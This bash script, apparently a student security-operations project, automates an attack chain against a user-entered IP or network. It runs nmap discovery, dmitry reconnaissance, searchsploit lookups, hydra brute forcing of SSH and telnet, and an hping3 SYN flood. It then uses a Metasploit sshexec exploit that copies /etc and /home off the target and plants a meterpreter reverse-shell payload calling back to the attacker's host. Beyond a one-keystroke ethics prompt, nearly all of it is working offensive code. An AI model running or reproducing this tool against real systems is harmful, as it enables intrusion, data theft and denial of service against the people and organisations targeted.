#! /bin/bash
function ethical
{
### Function to inform and gain acceptance of ethical user of script ###
echo -e '\n Terms And Conditions'	
echo -e "\n  Before proceeding with this script, you agree to use these tools responsibly and ethically, 
ensuring they are used only for authorized security testing and educational purposes. 
You understand the importance of respecting privacy and legal boundaries while conducting tests. 
By continuing, you accept full responsibility for any actions taken with these tools. \n"  
sleep 1s
read -n1 -p "Do you accept the terms and conditions? (y/n): " REPLY  #Read a single character for an input
if [[ $REPLY =~ ^[Yy]$ ]]  										 	 #Check user input is the requested Char			
then  
	echo -e "\n You accepted the terms and conditions. Proceeding..."  
else  
	echo -e "\n You did not accept the terms and conditions. Exiting..."  
	exit 
fi  
}

function tool_check
{
### Function to pre-requisite tools availability in host machine ###
echo -e '\n Tools Check \n'
echo -e '\n Description: Ensure requireed tools are available in host machine \n'
tool_count = 0										# Total tools count
req_tools=(nmap hydra dmitry searchsploit hping3 msfvenom msfconsole) # require commands from each tools
total_items=${#req_tools[@]}						# find number of elements in an array
echo "Total number of attack toolsrequired : $total_items"
			
for tool in "${req_tools[@]}"; do  					# for loop through each tool
	if command -v "$tool" &> /dev/null; then  		# check if tool is avail with command syntax
		echo "$tool is installed ....✔✔✔"			# print each tool
		tool_count=$((tool_count + 1))				# Total count of tools
	else
		echo "$tool is not installed ....✖✖✖"
	fi
done
if [ $tool_count -ne $total_items ]; then				# compare avail tool against the array size
	echo -e "You did not have the required number of tools"
	echo -e "Checks failed, Please have them install prior running the script....Exiting script/n"
	sleep 3s
    exit
else  
    echo -e "A total of $tool_count tools are installed, checks sucessful/n"
    sleep 3s
fi
}

function getIP_func
{
### Function to receive and validate IP or network address ###
read -p 'Enter a IP or Network address to be scanned with the CIDR notation (Eg. 12.123.123.0/24 or 123.123.154.20) : ' ip_add
pattern="[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/[0-9]{1,2}" #rgex pattern for IP address with CIDR notation
pattern1="[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"			 #rgex pattern for single IP address

#Validation of user input													
ip_add=$(echo "${ip_add}" | xargs)									#Remove leading and trailing whitespace

if [[ -z $ip_add ]]; then											#Check user input is empty
	echo "Error: Empty input. Please enter a valid IPv4 address."
	exit			
elif [[ $ip_add =~  [[:space:]] ]]; then							#Check white space in user input
	echo -e "Error: Input with whitespances. Please enter a valid IPv4 address."
	exit
elif [[ $ip_add =~ $pattern || $ip_add =~ $pattern1 ]]; then		#Check IP pattern of the user input
	echo -e "Network address matches the pattern : $ip_add \n"
	sleep 3s
else
	echo -e "\n Network address does not match the pattern \n"
	exit
fi
}

function netdis_func
{
### Function to check a network or single IP common open ports, OS, MAC ###
echo -e '\n Running Net discovery \n'
echo -e 'Description: discover avaialble services for a network or IP \n'
sleep 1s
netdis_results=$(nmap -sT -sU -O -T3 --min-parallelism 5 --max-parallelism 100 --min-rtt-timeout 100ms --max-rtt-timeout 500ms -n -F $ip_add  2> /dev/null |pv -t)			# run nmap for given network
Att_log "netdis_func" "nmap" "Port services discovered"											#Log results
echo "$netdis_results" > netdis_results.txt														#Export results to a file
echo "$netdis_results"|grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > IP_only.txt 	#Extract only IP address from the results

#log all ip address as part of the results.
mapfile -t tempiplst < IP_only.txt																#Store IPs into variable
for i in "${tempiplst[@]}"; do															
    Att_log "Netdiscovery" "IP list" "$i"														#Log results
done
echo -e '\n Running Net discovery completed ! \n'
}

function ip_selection
{
### Function to select a single ip address from a fix list ###
mapfile -t ipaddresslst < IP_only.txt									#Store IPs into variable
echo -e "\n Total number IP addresses: ${#ipaddresslst[@]} \n"
#Display the available IP addresses
echo -e "Available IP addresses:"
for ((i = 0; i < ${#ipaddresslst[@]}; i++)); do							#List down IPs with index
    echo "$i: ${ipaddresslst[i]}"
done
sleep 1s
read -p "Enter the number corresponding to the IP address: " choiceIP 	#Prompt the user to choose an IP address
echo -e "Your choice is $choiceIP"
#Save IP address as a choice to be used in the rest of the script
if (( "$choiceIP" >= 0 )) && (("$choiceIP" < ${#ipaddresslst[@]})); then #Validation of user choice
    selected_ip="${ipaddresslst[choiceIP]}"
    echo -e "You chose IP address: $selected_ip"
    Att_log "ip_selection" "IP" "IP address selected"	
else
    echo "Invalid input. Please enter a valid number."
    Att_log "ip_selection" "IP" "IP address selected"
    ip_selection
fi
}

function wkpass_func
{
### Function to brute force a SSH or TELNET service ###

echo -e '\n Running Password Attack \n'
echo -e 'Description:  login brute forcer for a particular service \n'
sleep 1s
read -p '\n Would like to to use the default password list [y/n] : ' choice_wk
echo 'Running weak password scan /n' 
#Descesion making proceess to supply new password lst
case $choice_wk in 
	n)
		while true 
		read -p 'Please provide full path and filename for Password list : ' usr_file
		do
			if [ -f $usr_file ]									#Check path&file provided is valid
			then
				echo -e "\n File exists : $usr_file \n"
				ls -lah $usr_file								#Print properties of file
				Att_log "wkpass_func" "Passwordlist" "new custom list"	#Log results 
				break
			else 
				echo -e "\n File not exists. \n"
				continue
			fi
		done
	;;
	y)
	
		passlst='./wordlst/top-passwords-shortlist.txt'			#Default password list
		Att_log "wkpass_func" "Passwordlist" "default list"	#Log results 
		echo "Existing password list is being used : $passlst"
	;;
	*)
		echo "Invalid option entered"
		Att_log "wkpass_func" "Passwordlist" "Invalid choice"	#Log results 
		wkpass_func												# repeat case for an invalid option
	;;
esac

#Ssh brute force, output is supressed and counter in place to measure progress
echo 'Testing weak password for ssh servicer (Kindly be patient)'
weakp_ssh=$(hydra -f -L ./wordlst/top-usernames-shortlist.txt  -P $passlst $selected_ip ssh -t6 2> /dev/null |pv -t)
Att_log "wkpass_func" "hydra-ssh" "ssh Bruteforce run sucessfully"										#Log results 
echo "$weakp_ssh" > weakp_ssh.txt								#Export results to a file

#Telnet brute force, output is supressed and counter in place to measure progress
echo 'Testing weak password for telnet servicer (Kindly be patient)'
weakp_telnet=$(hydra -f -L ./wordlst/top-usernames-shortlist.txt  -P $passlst $selected_ip telnet -t12 2> /dev/null |pv -t) # takes longer time for excution
Att_log	"wkpass_func" "hydra-telnet" "telnet Bruteforce run sucessfully"								#Log results
echo "$weakp_telnet" > weakp_telnet.txt							#Export results to a file

echo 'Running weak password scan completed ! /n' 
}

function vulner_func
{
### Function to check vulnerabilities of open service ###
echo -e '\n Running vulnerabilities scan \n' 
echo -e '\n Description: Vanerbility scanning of a target\n'
echo 'Generating NMAP Vulnerbility Analysis report(Kindly be patient)'
sleep 1s
sudo nmap -sV -F $selected_ip -oX nmap_resultsXML.xml >/dev/null |pv -t 	#XML for NMAP Vul analysis
Att_log	"vulner_func" "nmap" "namp output run sucessfully"					#Log results
echo 'Generating Searchspolit expolit report(Kindly be patient)'
ssp_results=$(searchsploit --nmap ./nmap_resultsXML.xml 2> /dev/null |pv -t)#Possible expolit details
Att_log "vulner_func" "searchsploit" "searchsploit run sucessfully"					#Log results
echo "$ssp_results" > ssp_results.txt										#Export results to a file
echo -e '\n Running vulnerabilities scan completed ! \n' 
}

function info_gather
{
### Function to check Perform whois,domain check,netcraft info,sub-domain check etc ###
echo -e '\n Running Info gathering scan \n' 
echo -e '\n Description: collect public information about a target host \n'
sleep 1s
infogather_results=$(dmitry -i -w  -n -e -p -f -s  $selected_ip 2> /dev/null |pv -t) 
Att_log	"info_gather" "dmitry" "dmitry run ssucessfully"							 #Log results
echo "$infogather_results" > infogather_results.txt									 #Export results to a file
echo -e '\n Running Info gathering scan completed ! \n'
}

function denial_func
{
### Function to deny the service of ssh or telnet port by flooding the targeted machine ###
echo -e '\n Running denial-of-service attack \n' 
echo -e '\n Description: To shut down a service or machine, so it wouldn’t accessible for intended users \n'
sleep 1s
#Validate port number
read -p "Enter a port number: "  portnbr
portnbr=$(echo "${portnbr}" | xargs)								#Remove leading and trailing whitespace

if [[ -z $portnbr ]]; then											#Check user input is empty
	echo "Error: Empty input. Please enter a valid Port number."
	Att_log	"denial_func" "hping3" "Did not run hping3  - Please enter a valid Port number"			#Log results
	denial_func			
elif [[ $ip_add =~  [[:space:]] ]]; then							#Check white space in user input
	echo -e "Error: Input with whitespaces. Please enter a valid Port number."
	Att_log	"denial_func" "hping3" "Did not run hping3  - Input with whitespaces"			#Log results
	denial_func	
elif [[ $portnbr -gt 0 && $portnbr -lt 65536 ]]; then				#Check range of port number
	dos_results=$(timeout 3m sudo hping3 -c 600000 -d 380 -S -w 64 -p $portnbr --flood $selected_ip)
	Att_log	"denial_func" "hping3" "Run hping3 sucessfully "			#Log results
	echo "$dos_results" > dos_results.txt							#Export results to a file
	echo -e '\n Running denial-of-service attack completed ! \n'
else
	echo "Invalid port number. Please enter a number between 1 and 65535." 
	Att_log	"denial_func" "hping3" "Did not run hping3 - exit condition"			#Log results 
	denial_func
fi
  	
}

function exploit_func
{
### Exploiting an SSH vulnerability with Meterpreter to download files upload a Reverse Shell Payload ###
echo -e '\n Running exploit scripts against SSH service and uploading payloads \n' 
echo -e '\n Description: To download user/system files and upload a Reverse Shell Payload \n'

#Prepare payload with msfvenom
hostname=$(hostname -I)											#Retrieves the IP addresses
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$hostname LPORT=4444 -f elf > reverse.elf #generate payload
if [ $? -ne 0 ]; then
    echo "Failed to generate payload with msfvenom."
    Att_log "exploit_func" "msfvenom" "Failed to generate payload with msfvenom."
    exit
fi
chmod +x reverse.elf											#Payload to be excutable format
Att_log	echo "exploit_func" "msfvenom" "Generated payload with msfvenom"				#Log results

#Set variables for target IP and exploit module for Metasploit										
read -p "Please provide the username to loging to ssh :" exp_username	#Set user and password exploit target
read -p "Please provide the password to loging to ssh :" exp_password
exploit_module="exploit/multi/ssh/sshexec"						#Set SSH module
#exploit_module="exploit/unix/telnet/telnet_encrypt_keyid"

#Create a Metasploit AutoRunScript resource script to automate Meterpreter commands after session created
echo "download -r /etc" > commands.rc							#Download all files frome directory
echo "download -r /home/" >> commands.rc
echo "upload reverse.elf" >> commands.rc						#Upload payload to existing directoy
echo "./reverse.elf" >> commands.rc								#Upload payload all files from directory
echo "exit" >> commands.rc										#Exit Meterpreter
echo "exit" >> commands.rc
Att_log	"exploit_func" "msfvenom" "AutoRunScript created - commands.rc"	

#Create a Metasploit resource script to automate Meterpreter login
echo "use $exploit_module" > meterpreter.rc						#Use exploit module
echo "set RHOSTS $selected_ip" >> meterpreter.rc				#Set RHOST IP
echo "set USERNAME $exp_username" >> meterpreter.rc					#Set Username
echo "set PASSWORD $exp_password" >> meterpreter.rc					#Set Password
echo "set AutoRunScript ./commands.rc" >> meterpreter.rc		#Run the commands.rc once upon sucessfull session 
echo "exploit -j -z" >> meterpreter.rc							#Run exploit
echo "sleep 180" >> meterpreter.rc
echo "exit" >> meterpreter.rc
Att_log	"exploit_func" "msfvenom" "meterpreter.rc created"	

#Execute Metasploit with the resource script
echo -e '\n excuting msf script - 3mins run time \n'
msf_results=$(msfconsole -q -r meterpreter.rc)					#Run customised RC script

#Log results
if [ $? -ne 0 ]; then
    echo "Failed to start msfconsole."
    Att_log "exploit_func" "msfvenom" "Failed to start msfconsole."
    exit
fi
Att_log	"exploit_func" "msfvenom" "Run msfconsole sucessfully"	
echo "$msf_results" > msf_results.txt							#Export results to a file

#Clean up the resource scripts
rm meterpreter.rc												#Delete RC scripts
rm commands.rc
Att_log	echo "exploit_func" "msfvenom" "RC scripts deleted"	
echo -e '\n Running exploit scripts completed ! \n'
}

function cust_attk
{
### Custom attack allows user to choose the type of attack ###
#Execute prerequisite funtion
netdis_func > >(tee -ap "$log_loc")						#Run netdiscovery and screen output to log file
ip_selection > >(tee -ap "$log_loc")					#Sets the IP address thats needs to be for the attack tools.
sleep 2
#Display options for custom scan
while true	
do	
	echo " "
	echo "1 for Network discovery"
	echo "2 for Vulnerable testing"
	echo "3 for Brute force Attack"
	echo "4 for Denial of Service Attack"
	echo "5 for Access (SSH) and Exploit target"
	echo "6 for Change selected IP address"
	echo "e for Exit Scan"
	
	read -p 'Choose the scan you would like to perform : ' usr_Option1 #get user option on scan output
	case $usr_Option1 in 
		1)
			info_gather > >(tee -ap "$log_loc")	 		#run dmitry and screen output to log file		
		;;
		2)
			vulner_func > >(tee -ap "$log_loc")			#run vulnerable testing (nmap) and exploit (searchsploit) suggestion and screen output to log file
		;;
		3)
			wkpass_func > >(tee -ap "$log_loc")			#run brute force (medusa) tools and screen output to log file
		;;
		4)
			denial_func	> >(tee -ap "$log_loc")			#Run Dos (hping3) tools and screen output to log file
		;;
		5)
			exploit_func > >(tee -ap "$log_loc")		#Run MSF Venom and Metasploit for exploitation
		;;
		6)
			ip_selection > >(tee -ap "$log_loc")		#Run MSF Venom and Metasploit for exploitation
		;;
		e)
			echo "Exit script" 
			exit 										#exit script
		;;
		*)
			echo "Invalid option" 
			continue 									#re-run the loop due to invalid option
		;;
	esac
done
		
}

function Att_log 
{  
  ### Function to log details of Attack tools ###

   attlg_timestamp=$(date +"%Y-%m-%d %H:%M:%S")						#Combination of customised Timestamp
   attlg_hostname=$(hostname)    
   attlg_attack_type=$1												#Attack tyoe
   attlg_message=$2													#Message
   attlg_result=$3  												#Results of the attact
   attlg_log_file="/var/log/Penl2_ATT.log"  						#Location of log file
  
  #Configuration of the output to the log
  echo "[$attlg_timestamp] [$attlg_hostname] Attack-type $attlg_attack_type : $attlg_message : $attlg_result" >> $attlg_log_file
}  

function Slog_event
{
### Function to log details of whole script ###
log_loc="/var/log/Penl2.log"							#Location of log file
if [ -f "$log_loc" ];
then
	continue 2> /dev/null								#Checks for existing log	
else
	touch "$log_loc" 									#create log file
	#Configuration of the output to the log
	(date; hostname) |tr '\n' '\t' |tee -ap "$log_loc" 	#timestamp to log file
fi	
}
### Start of script ###
Slog_event 													#Standard log enabled

### Banner introduction ###
figlet -mini Project - SOC
echo -e " ******* S10 - Muhammad Feroz (PRJ: Shadow Sentry)*********** \n"
(date; hostname) |tr '\n' '\t'|tee -a "$log_loc"			#Capture date and hostname to standard log
echo "*\*Start Script*/*" |tee -ap "$log_loc"

### Prerequsite Function ###
tool_check	> >(tee -ap "$log_loc")							#Check required tools availability + capture log
ethical		> >(tee -ap "$log_loc")							#Ethical funtion called first + capture log
getIP_func 	> >(tee -ap "$log_loc") 						#Get network address and screen output to log file + capture log

### Selection of Attack method ###
while true
do
	echo "** Main Menu **"
	echo "1 for Structured Attack" 							#Sequential running of attack script
	echo "2 for Customised Attack"							#Ability to choose attack mode
	echo "e for Exit Attack"
	read -n1 -p 'Choose the attack you would like to perform : ' usr_Option #User input to be a single char
	
	case $usr_Option in 									#User Case to manage attack choices
		1)
			echo -e '\n *** Structured Attack *** \n'
			(date; hostname) |tr '\n' '\t'|tee -a "$log_loc"
			### Functions Structured Attack ###
			sleep 3s
			netdis_func > >(tee -ap "$log_loc") 			#Run netdiscovery and screen output to log file
			ip_selection > >(tee -ap "$log_loc")			#Sets the IP address thats needs to be for the attack tools.
			info_gather > >(tee -ap "$log_loc")				#Run dmitry and screen output to log file
			vulner_func > >(tee -ap "$log_loc")				#Run vulerbility testing (nmap) and exploit (searchsploit) suggestion and screen output to log file
			wkpass_func > >(tee -ap "$log_loc")				#Run brute force (medusa) tools and screen output to log file
			denial_func	> >(tee -ap "$log_loc")				#Run Dos (hping3) tools and screen output to log file
			exploit_func > >(tee -ap "$log_loc")			#Run MSF Venom and Metasploit for exploitation
			echo -e '\n *** Attack COMPLETED *** \n'			
		;;
		2)
			echo -e '\n *** Customised Attack *** \n'
			(date; hostname) |tr '\n' '\t'|tee -a "$log_loc"
			### Functions Customised Attack ###
			sleep 3s
			cust_attk										#Run the custom fucntion allow user to choose attack type
			echo -e '\n *** Attack COMPLETED *** \n'
		;;
		e)
			echo "Exit script" 
			exit 											#Exit script
		;;
		*)
			echo "Invalid option" 
			continue 										#Re-run the loop due to invalid option
		;;
	esac
done
(date; hostname) |tr '\n' '\t'|tee -a "$log_loc"			#Capture date and hostname to standard log
echo "*\*End Script*/*" |tee -ap "$log_loc"
### End of Attack script ###
exit
